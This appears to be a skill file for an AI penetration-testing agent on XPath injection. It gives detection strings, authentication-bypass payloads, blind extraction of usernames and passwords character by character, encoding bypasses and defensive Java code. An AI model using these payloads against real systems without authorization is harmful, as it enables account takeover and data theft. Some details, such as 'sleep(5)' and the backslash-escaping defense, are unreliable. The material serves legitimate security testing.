---
name: xpath-injection-testing
description: Professional skills and methodology for XPath injection vulnerability testing
version: 1.0.0
---

# XPath Injection Vulnerability Testing

## Overview

XPath injection is a vulnerability similar to SQL injection that exploits flaws in how XPath query statements are constructed, potentially leading to information disclosure, authentication bypass, and more. This skill provides methods for detecting, exploiting, and defending against XPath injection.

## Vulnerability Principle

The application concatenates user input directly into an XPath query statement without adequate validation and filtering, allowing an attacker to modify the query logic.

**Dangerous code example:**
```java
String xpath = "//user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(xpath);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## XPath Basics

### Query Syntax

**Basic queries:**
```
//user[username='admin']
//user[@id='1']
//user[username='admin' and password='pass']
//user[username='admin' or username='user']
```

### Functions

**Common functions:**
- `text()` - get text content
- `count()` - count
- `substring()` - substring
- `string-length()` - string length
- `contains()` - containment check

## Testing Methodology

### 1. Identify XPath Input Points

**Common features:**
- User login
- Data search
- XML data query
- Configuration query

### 2. Basic Detection

**Test special characters:**
```
' or '1'='1
' or '1'='1' or '
' or 1=1 or '
') or ('1'='1
```

**Test logical operators:**
```
' or '1'='1
' and '1'='2
' or 1=1 or '
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: admin' or '1'='1
Password: anything
Query: //user[username='admin' or '1'='1' and password='anything']
```

**More precise bypass:**
```
Username: admin') or ('1'='1
Query: //user[username='admin') or ('1'='1' and password='*']
```

### 4. Information Disclosure

**Enumerate users:**
```
' or 1=1 or '
' or '1'='1
') or 1=1 or ('
```

**Get node count:**
```
' or count(//user)>0 or '
```

**Get a specific node:**
```
' or substring(//user[1]/username,1,1)='a' or '
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logical bypass**
```
Input: admin' or '1'='1
Query: //user[username='admin' or '1'='1' and password='*']
Result: matches all users
```

**Method 2: Comment bypass**
```
Input: admin')] | //* | //*[('
Query: //user[username='admin')] | //* | //*[('' and password='*']
```

**Method 3: Boolean-based blind injection**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,1,1)='b' or '
```

### Information Disclosure

**Enumerate all users:**
```
' or 1=1 or '
Result: returns all user nodes
```

**Get the username:**
```
' or substring(//user[1]/username,1,1)='a' or '
' or substring(//user[1]/username,2,1)='d' or '
Retrieve each character step by step
```

**Get the password:**
```
' or substring(//user[1]/password,1,1)='p' or '
Retrieve password characters step by step
```

### Blind Injection Techniques

**Time-based blind injection:**
```
' or count(//user[substring(username,1,1)='a'])>0 and sleep(5) or '
```

**Boolean-based blind injection:**
```
' or substring(//user[1]/username,1,1)='a' or '
Observe differences in the response
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
' or '1'='1 → %27%20or%20%271%27%3D%271
```

**HTML entity encoding:**
```
' → &#39;
" → &quot;
< → &lt;
> → &gt;
```

### Comment Bypass

**Using comments:**
```
' or 1=1 or '
' or '1'='1' or '
```

### Function Bypass

**Using different functions:**
```
substring(//user[1]/username,1,1)
substring(//user[position()=1]/username,1,1)
//user[1]/username/text()[1]
```

## Tool Usage

### XPath Expression Testing

**Online tools:**
- XPath Tester
- XMLSpy
- Oxygen XML Editor

### Burp Suite

1. Intercept the XPath query request
2. Modify the query parameter
3. Observe the response

### Python Script

```python
from lxml import etree
from lxml.etree import XPath

# Load the XML document
doc = etree.parse('users.xml')

# Test the injection
xpath_expr = "//user[username='admin' or '1'='1']"
xpath = XPath(xpath_expr)
results = xpath(doc)
print(results)
```

## Verification and Reporting

### Verification Steps

1. Confirm that the XPath query can be controlled
2. Verify authentication bypass or information disclosure
3. Assess the impact (unauthorized access, data leakage, etc.)
4. Record a complete PoC
5. Submit confirmed vulnerabilities to the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform), covering fields such as location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and input parameter
- How the XPath query is constructed
- Complete exploitation steps and PoC
- Remediation recommendations (input validation, parameterized queries, etc.)

## Defensive Measures

### Recommended Approaches

1. **Input validation**
   ```java
   private static final String[] XPATH_ESCAPE_CHARS = 
       {"'", "\"", "[", "]", "(", ")", "=", ">", "<", " "};
   
   public static String escapeXPath(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(XPATH_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use XPath variables
   String xpath = "//user[username=$username and password=$password]";
   XPathExpression expr = xpath.compile(xpath);
   XPathVariableResolver resolver = new MapVariableResolver(
       Map.of("username", escapedUsername, "password", escapedPassword));
   expr.setXPathVariableResolver(resolver);
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Use precompiled queries**
   ```java
   // Predefined query template
   private static final String LOGIN_QUERY = 
       "//user[username=$1 and password=$2]";
   
   // Use parameter binding
   ```

5. **Least privilege**
   - Restrict the scope of XPath queries
   - Use access control
   - Restrict which nodes can be queried

## Notes

- Only perform in authorized test environments
- Note the syntax differences between XPath versions
- Avoid affecting XML data during testing
- Understand the target application's XPath implementation
